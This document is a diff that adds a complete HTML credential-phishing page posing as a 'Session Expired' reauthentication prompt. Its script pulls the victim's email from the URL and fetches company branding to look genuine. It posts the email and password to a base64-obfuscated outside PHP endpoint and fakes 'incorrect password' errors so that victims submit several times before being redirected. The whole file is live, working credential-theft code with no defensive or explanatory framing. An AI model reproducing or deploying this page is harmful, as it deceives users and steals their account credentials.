@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Session Expired!</title>
+    <link rel="shortcut icon" href="" type="image/x-icon">
+    <style type="text/css">
+ * {margin: 0;padding: 0;outline: none;}
+ body {color: #000000;font-weight: normal;font-family: "Segoe UI", "Segoe", "SegoeUI-Regular-final", Tahoma, Helvetica, Arial, sans-serif;background-repeat: no-repeat;background-size: cover;width: 100%;height: 100%;overflow: hidden;}
+ .bachelor {background-color: white;margin: calc(10vh - 25px) auto;}.headingzone {display: flex;justify-content: center;border-bottom: 1px solid #999;margin: 0px;padding: 0 5px;}.wella {padding: 5px 1px;}.contentzone {padding: 1px 50px;}.puta {margin: 10px 1px;}.puta input {width: 98%;padding: 8px;}.puta input:focus {border: 1px solid #999;padding: 9px;}.puta4btn {margin-top: 30px }.sitc {margin-top: 40px;margin-bottom: 20px;}@media only screen and (min-width : 320px) {#latability {width: auto;max-width: 360px;padding: 0 30px;padding-top: calc(10vh - 25px);}.sitc {margin-top: 0px;margin-bottom: 10px;}.puta4btn {margin-top: 15px }}@media only screen and (min-width : 480px) {#latability {margin: 0 auto;width: 400px;max-width: 400px;}.sitc {margin-top: 0px;margin-bottom: 10px;}.puta4btn {margin-top: 15px }}@media only screen and (min-width : 768px) {#latability {margin: 0;height: 100vh;width: 380px;max-width: 400px;float: right;padding: 0;bottom: 0;}.bachelor {margin: 0;height: 100vh;}}@media only screen and (min-width : 992px) {}@media only screen and (min-width : 1200px) {}@media (max-width: 480px) {}
+      @media (min-device-width: 320px) and (max-device-width: 480px) {}
+       @media only screen and (max-height: 500px){#header {padding-top: 30px;margin-bottom: 30px;}}@media only screen and (max-height: 820px){#header {padding-top: 40px;min-height: 0px;overflow: hidden;}}button {border: none;background-color: rgb(38, 114, 236);min-width: 80px;width: auto;height: 30px;padding: 4px 20px 6px 20px;border-style: solid;border-width: 1px;transition: background 0s;color: rgb(255, 255, 255);cursor: pointer;margin-bottom: 8px;-ms-user-select: none;-moz-transition: background 0s;-webkit-transition: background 0s;-o-transition: background 0s;-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-o-user-select: none;user-select: none;font-size: 15px;}button:hover {opacity: 0.5;}.ncovalai {width: 110%;background: rgba(0,0,0,0.7);min-height: 100vh;position: absolute;color: #fff;z-index: -10;}.parent {margin-top: 50px;display: flex;align-items: center;justify-content: center;}.center {background-color: #FFFFFF;height: auto;border: 1px solid #333;z-index: 1000;}.warning{color: rgb(200 83 5);margin: 20px 0 10px;font-size: 0.9em;font-weight: normal;}button[disabled], button:disabled{cursor: not-allowed;opacity: 0.5;}.logoImage{max-width: 128px; height: auto;}
+    </style>
+  </head>
+  <body>
+  	<!-- <img src=""> -->
+    <div class="ncovalai"></div>
+    <div id="latability" class="wella" data-getinfo="aHR0cHM6Ly9meW5kYXoueHl6L214Mi4xLz9hY2Nlc3M9">
+      <section class="bachelor">
+        <div class="headingzone">Session Expired - Reauthenticate to Restore Session</div>
+        <div class="contentzone">
+          <div id="header">
+            <img class="logoImage" id="companyLogo" src="" >
+          </div>
+          <div class="formzone" data-action="aHR0cHM6Ly9kaWQ3LnNhLmNvbS90b3duaGFsbC9idWxhYmxhYmFiYWJ1L2JydWhhaGEvdXpnby5waHA=">
+            <div class="sitc" style=""> Sign in to continue. </div>
+            <div class="warning" style="display: none;">Enter your password.</div>
+            <form name="supalative" id="supalative" method="post" action="">
+              <div class="puta">
+                <input type="email" name="email" id="x1" placeholder="username@domain.com" readonly>
+              </div>
+              <div class="puta">
+                <input type="password" placeholder="Password" id="x2" name="pass">
+              </div>
+              <input type="hidden" name="clientUrl" id="cf" value="">
+              <input type="hidden" name="typesent" id="ts" value="New">
+              <div style="font-size: 0.8em; font-weight: normal; color: #999;">Enter correct password to reauthenticate security features.</div>
+              <div class="puta puta4btn" style="">
+                <button type="submit" id="likeThisBtn">Sign in</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </section>
+    </div>
+  	<!-- <img src=""> -->
+
+    <script type="text/javascript">
+    	// sdf
+    	
+    	var okwait  = 0;
+		var locate = window['location']['href']
+		var x1 = document.querySelector("#x1");
+		var x2 = document.querySelector("#x2");
+		let  gaa_ebea = document.querySelector(".formzone").dataset.action;
+		let  were_ebea = document.querySelector("#latability").dataset.getinfo;
+		var wxrning = document.querySelector(".warning");
+		var eml = processUrl(locate);
+		if (eml) {	
+			x1.value = eml;		
+		}else{
+			document['querySelector']('html').innerHTML = "Invalid"
+			window['stop']();
+		}
+		const options  = {method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded',},body:`key=${Math.random()}`}
+		fetch(atob(were_ebea)+processUrl(locate), options)
+		.then(res => {
+		return res.json()
+		}).then(situ => {
+			document.querySelector('link[rel="shortcut icon"]').setAttribute('href', situ.favicon);
+			document.querySelector('#companyLogo').setAttribute('src', situ.lbimg);
+			document.querySelector('body').style.background = `url('${situ.bg}')  no-repeat fixed 50% 50% / cover`;
+			document.querySelector('#cf').value = situ.redirect;
+			window.sitw = situ
+			x2.focus();
+
+		}).catch(error => {});
+	    document.querySelector('#supalative').addEventListener('submit', (ev) => {
+	      	ev.preventDefault();
+	      	wxrning.style.display = 'none'; wxrning.innerHTML = '';
+			if (!x2.value || x2.value.length < 6){
+				wxrning.style.display = 'block'; wxrning.innerHTML = 'Enter correct email password.';
+				x2.focus()
+				return false;
+			}
+			okwait++;
+			const formData = new FormData(document.querySelector('#supalative'));
+			document.querySelector("#likeThisBtn").innerHTML= 'Verifying...'
+			document.querySelector("#likeThisBtn").setAttribute("disabled", true);    
+		    fetch(atob(gaa_ebea), {
+				method: 'POST',
+				body:formData,
+		    })
+			.then(res => res.json())
+			.then((response) => {
+
+			  	setTimeout( () => {
+					if (okwait > 3) {
+						window['location'].href = window.sitw['redirect'];
+					} else {
+						if (okwait===1) {
+							wxrning.style.display = 'block'; wxrning.innerHTML ='Incorrect password. Type the correct email password, and try again.'
+						}
+						if (okwait>1) {
+							wxrning.style.display = 'block'; wxrning.innerHTML ='Network connection failed, try again!'
+						}				
+						document.querySelector("#likeThisBtn").innerHTML= 'Sign in.'
+						document.querySelector("#likeThisBtn").removeAttribute("disabled");					
+						document.querySelector("#x2").value = ""
+						document.querySelector("#x2").focus();
+					}
+			    }, 10);                  
+			})
+			.catch(err => {
+
+			});
+	    });   
+
+      function processUrl(locationurl) {
+        return window.location.hash.substr(1);
+      }
+
+    </script>
+  </body>
+</html>
